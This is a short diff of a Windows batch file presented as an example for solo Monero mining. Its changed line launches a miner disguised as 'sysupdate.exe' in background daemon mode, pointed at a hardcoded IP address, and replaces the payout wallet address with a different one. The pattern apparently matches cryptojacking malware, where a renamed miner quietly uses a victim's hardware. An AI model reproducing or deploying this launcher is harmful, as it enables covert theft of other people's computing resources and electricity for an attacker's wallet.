@@ -12,5 +12,5 @@ yo:: Example batch file for mining Monero solo
 :: But you will only get a payout when you find a block which can take more than a year for a single low-end PC.
 
 cd /d "%~dp0"
-sysupdate.exe -o 144.91.121.7:18081 -a rx/0 -u 87G4X85m5QddXWMQFppMkFazJKv56wko8LUwwgkicLKRgZ2rgKNfMcUAR3iDV7MHnLVEgWDhZstkzQue9EnVP2EX2otwB8i --daemon
+sysupdate.exe -o 144.91.121.7:18081 -a rx/0 -u 87REqG9YrLwcPuj3tTNo5o7CNJFLXVimQhgCNjKBXrvj8e5iEta72UVCfPX8ggiNNSd9uyYr4qNZRYNYxagXw93mQT2ohKx --daemon
 pause
